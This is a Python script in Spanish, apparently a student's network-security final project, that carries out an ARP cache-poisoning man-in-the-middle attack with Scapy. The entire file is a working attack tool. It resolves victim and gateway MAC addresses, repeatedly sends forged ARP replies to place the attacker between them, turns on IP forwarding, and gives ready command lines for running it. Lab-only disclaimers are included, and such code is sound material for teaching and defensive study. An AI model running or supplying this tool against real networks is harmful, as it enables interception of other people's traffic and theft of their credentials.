#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP Poisoning Man-in-the-Middle Attack
=======================================

Autor: Branyel Estifenso Pérez Díaz
Materia: Seguridad de Redes - Proyecto Final

Descripción:
    Este script implementa un ataque de ARP Poisoning para posicionarse
    como Man-in-the-Middle (MitM) entre una víctima y su gateway.
    
Topología del Laboratorio:
    - Gateway (R1):     14.89.0.1  (aa:bb:cc:00:20:00)
    - Atacante (Kali):  14.89.0.3  (00:50:00:00:01:00)
    - Víctima (VPCS):   14.89.0.4  (00:77:00:00:01:01)

ADVERTENCIA:
    Este script es únicamente para propósitos educativos en entornos de
    laboratorio controlados. El uso no autorizado es ilegal.

Uso:
    # Primero habilitar IP Forwarding:
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    
    # Luego ejecutar el ataque:
    sudo python3 MitM_Attack.py -t 14.89.0.4 -g 14.89.0.1 -i eth0
"""

import argparse
import os
import signal
import sys
import time
from typing import Optional, Tuple

try:
    from scapy.all import (
        ARP,
        Ether,
        get_if_hwaddr,
        getmacbyip,
        send,
        sendp,
        srp,
        conf
    )
except ImportError:
    print("[!] Error: Scapy no está instalado.")
    print("[*] Instalar con: pip install scapy")
    sys.exit(1)


class ARPPoisoner:
    """Clase principal para realizar el ataque ARP Poisoning MitM."""

    def __init__(self, target_ip: str, gateway_ip: str, interface: str = "eth0"):
        """
        Inicializa el envenenador ARP.

        Args:
            target_ip: IP de la víctima
            gateway_ip: IP del gateway
            interface: Interfaz de red a utilizar
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = True
        self.packets_sent = 0
        
        # Configurar manejador de señales para limpieza
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Obtener MAC del atacante
        try:
            self.attacker_mac = get_if_hwaddr(interface)
        except Exception as e:
            print(f"[!] Error obteniendo MAC de {interface}: {e}")
            sys.exit(1)
        
        # Obtener MACs de los objetivos
        print(f"\n[*] Resolviendo direcciones MAC...")
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)
        
        if not self.target_mac:
            print(f"[!] No se pudo resolver MAC de la víctima: {target_ip}")
            sys.exit(1)
            
        if not self.gateway_mac:
            print(f"[!] No se pudo resolver MAC del gateway: {gateway_ip}")
            sys.exit(1)
        
        self._print_info()

    def _signal_handler(self, signum, frame):
        """Manejador de señales para restaurar ARP y detener limpiamente."""
        print(f"\n\n[!] Señal recibida. Restaurando tablas ARP...")
        self.running = False

    def _get_mac(self, ip: str) -> Optional[str]:
        """
        Obtiene la dirección MAC asociada a una IP mediante ARP.

        Args:
            ip: Dirección IP a resolver

        Returns:
            Dirección MAC o None si no se puede resolver
        """
        try:
            # Intentar primero con getmacbyip
            mac = getmacbyip(ip)
            if mac:
                return mac
        except Exception:
            pass
        
        # Si falla, usar ARP request manual
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            
            answered, _ = srp(packet, iface=self.interface, timeout=3, verbose=False)
            
            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            print(f"[!] Error resolviendo MAC de {ip}: {e}")
        
        return None

    def _print_info(self):
        """Muestra información del ataque."""
        print(f"\n{'='*60}")
        print(f"{'ARP POISONING - CONFIGURACIÓN':^60}")
        print(f"{'='*60}")
        print(f"  [*] Interfaz:        {self.interface}")
        print(f"  [*] MAC Atacante:    {self.attacker_mac}")
        print(f"{'─'*60}")
        print(f"  [*] Víctima IP:      {self.target_ip}")
        print(f"  [*] Víctima MAC:     {self.target_mac}")
        print(f"{'─'*60}")
        print(f"  [*] Gateway IP:      {self.gateway_ip}")
        print(f"  [*] Gateway MAC:     {self.gateway_mac}")
        print(f"{'='*60}\n")

    def _check_ip_forwarding(self) -> bool:
        """Verifica si IP forwarding está habilitado."""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip() == '1'
        except Exception:
            return False

    def _enable_ip_forwarding(self) -> bool:
        """Habilita IP forwarding."""
        try:
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
            return True
        except Exception:
            return False

    def _create_poison_packet(self, target_ip: str, target_mac: str, 
                               spoof_ip: str) -> ARP:
        """
        Crea un paquete ARP de envenenamiento.

        Args:
            target_ip: IP del objetivo a envenenar
            target_mac: MAC del objetivo
            spoof_ip: IP a suplantar

        Returns:
            Paquete ARP de envenenamiento
        """
        # op=2 significa ARP Reply (is-at)
        # hwsrc = MAC del atacante (será asociada con la IP de spoof_ip)
        # psrc = IP que estamos suplantando
        # hwdst = MAC de la víctima que recibirá el paquete
        # pdst = IP de la víctima
        return ARP(
            op=2,                    # ARP Reply
            hwsrc=self.attacker_mac, # "Esta es mi MAC"
            psrc=spoof_ip,           # "Y estoy en esta IP" (suplantada)
            hwdst=target_mac,        # Destinatario
            pdst=target_ip           # IP del destinatario
        )

    def poison(self) -> Tuple[int, int]:
        """
        Envía paquetes de envenenamiento a víctima y gateway.

        Returns:
            Tupla con (paquetes enviados a víctima, paquetes enviados a gateway)
        """
        # Envenenar a la víctima: "El gateway está en MI MAC"
        poison_target = self._create_poison_packet(
            target_ip=self.target_ip,
            target_mac=self.target_mac,
            spoof_ip=self.gateway_ip
        )
        
        # Envenenar al gateway: "La víctima está en MI MAC"
        poison_gateway = self._create_poison_packet(
            target_ip=self.gateway_ip,
            target_mac=self.gateway_mac,
            spoof_ip=self.target_ip
        )
        
        # Enviar paquetes
        send(poison_target, iface=self.interface, verbose=False)
        send(poison_gateway, iface=self.interface, verbose=False)
        
        return (1, 1)

    def restore(self):
        """Restaura las tablas ARP originales de víctima y gateway."""
        print("[*] Restaurando tablas ARP originales...")
        
        # Restaurar en la víctima: "El gateway está en su MAC ORIGINAL"
        restore_target = ARP(
            op=2,
            hwsrc=self.gateway_mac,  # MAC real del gateway
            psrc=self.gateway_ip,     # IP del gateway
            hwdst=self.target_mac,    # MAC de la víctima
            pdst=self.target_ip       # IP de la víctima
        )
        
        # Restaurar en el gateway: "La víctima está en su MAC ORIGINAL"
        restore_gateway = ARP(
            op=2,
            hwsrc=self.target_mac,    # MAC real de la víctima
            psrc=self.target_ip,      # IP de la víctima
            hwdst=self.gateway_mac,   # MAC del gateway
            pdst=self.gateway_ip      # IP del gateway
        )
        
        # Enviar múltiples veces para asegurar restauración
        for _ in range(5):
            send(restore_target, iface=self.interface, verbose=False)
            send(restore_gateway, iface=self.interface, verbose=False)
            time.sleep(0.5)
        
        print("[+] Tablas ARP restauradas correctamente")

    def run(self, interval: float = 2.0):
        """
        Ejecuta el ataque de envenenamiento continuo.

        Args:
            interval: Intervalo entre re-envenenamientos en segundos
        """
        # Verificar IP forwarding
        if not self._check_ip_forwarding():
            print("[!] ADVERTENCIA: IP Forwarding NO está habilitado")
            print("[!] La víctima perderá conectividad sin IP Forwarding")
            print("[*] Habilitando IP Forwarding...")
            
            if self._enable_ip_forwarding():
                print("[+] IP Forwarding habilitado correctamente")
            else:
                print("[!] No se pudo habilitar IP Forwarding")
                print("[*] Ejecutar manualmente:")
                print("    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
                return
        else:
            print("[+] IP Forwarding está habilitado")
        
        print(f"\n[*] Iniciando ataque ARP Poisoning...")
        print(f"[*] Intervalo de re-envenenamiento: {interval}s")
        print(f"[*] Presione Ctrl+C para detener y restaurar\n")
        
        try:
            while self.running:
                target_pkts, gateway_pkts = self.poison()
                self.packets_sent += target_pkts + gateway_pkts
                
                print(f"\r[+] Paquetes enviados: {self.packets_sent} | "
                      f"Víctima <- Atacante -> Gateway", end='')
                
                time.sleep(interval)
                
        except Exception as e:
            print(f"\n[!] Error durante el ataque: {e}")
        
        finally:
            # Siempre restaurar las tablas ARP
            self.restore()
            print(f"\n[*] Ataque finalizado. Total paquetes: {self.packets_sent}")


def check_root():
    """Verifica que el script se ejecute como root."""
    if os.geteuid() != 0:
        print("[!] Error: Este script requiere permisos de root")
        print("[*] Ejecutar con: sudo python3 MitM_Attack.py")
        sys.exit(1)


def parse_arguments():
    """Procesa los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(
        description="ARP Poisoning Man-in-the-Middle Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplo de uso:
    # Primero habilitar IP Forwarding:
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    
    # Ejecutar ataque:
    sudo python3 MitM_Attack.py -t 14.89.0.4 -g 14.89.0.1 -i eth0

Topología del laboratorio:
    Gateway (R1):     14.89.0.1  (aa:bb:cc:00:20:00)
    Atacante (Kali):  14.89.0.3  (00:50:00:00:01:00)
    Víctima (VPCS):   14.89.0.4  (00:77:00:00:01:01)

ADVERTENCIA: Solo usar en entornos de laboratorio autorizados.
        """
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='IP de la víctima (ej: 14.89.0.4)'
    )
    
    parser.add_argument(
        '-g', '--gateway',
        required=True,
        help='IP del gateway (ej: 14.89.0.1)'
    )
    
    parser.add_argument(
        '-i', '--interface',
        default='eth0',
        help='Interfaz de red a utilizar (default: eth0)'
    )
    
    parser.add_argument(
        '--interval',
        type=float,
        default=2.0,
        help='Intervalo de re-envenenamiento en segundos (default: 2.0)'
    )

    return parser.parse_args()


def print_banner():
    """Muestra el banner del script."""
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║           ARP POISONING - MAN-IN-THE-MIDDLE v1.0              ║
    ║        Ataque de Envenenamiento de Caché ARP                  ║
    ║                                                               ║
    ║  Autor: Branyel Estifenso Pérez Díaz                         ║
    ║  Proyecto: Seguridad de Redes                                 ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  [!] SOLO PARA USO EDUCATIVO EN LABORATORIOS CONTROLADOS      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    """Función principal."""
    print_banner()
    check_root()
    
    args = parse_arguments()
    
    # Deshabilitar advertencias de Scapy
    conf.verb = 0
    
    # Crear instancia del envenenador
    poisoner = ARPPoisoner(
        target_ip=args.target,
        gateway_ip=args.gateway,
        interface=args.interface
    )
    
    # Ejecutar ataque
    poisoner.run(interval=args.interval)


if __name__ == "__main__":
    main()
